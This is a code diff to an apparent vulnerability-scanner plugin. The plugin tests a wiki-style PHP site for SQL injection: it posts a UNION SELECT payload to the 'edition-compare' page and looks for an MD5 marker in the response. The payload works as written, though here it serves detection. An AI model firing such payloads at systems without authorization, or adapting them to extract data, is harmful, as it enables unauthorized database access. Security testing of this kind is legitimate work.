@@ -34,9 +34,9 @@ class Poc(ABPoc):
                 target=self.target, vuln=self.vuln))
             url = '{target}'.format(target=self.target)+'/index.php?edition-compare-1'
             post_data_test=' "eid[0]=2&eid[1]=19&eid[2]=-3) UNION SELECT 1,2,35,4,5,6,7,8,9,10,11,12,md5(123),14,15,16,17,18,19 %23" '
-            code,head,body,errcode,fina_url= hh.http('-d'+post_data_test+url)
-                       
-            if code == 200 and '202cb962ac59075b964b07152d234b70' in body :
+            req = requests.post(url, data=post_data_test)
+
+            if req.status_code == 200 and '202cb962ac59075b964b07152d234b70' in req.text :
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
 
         except Exception, e:
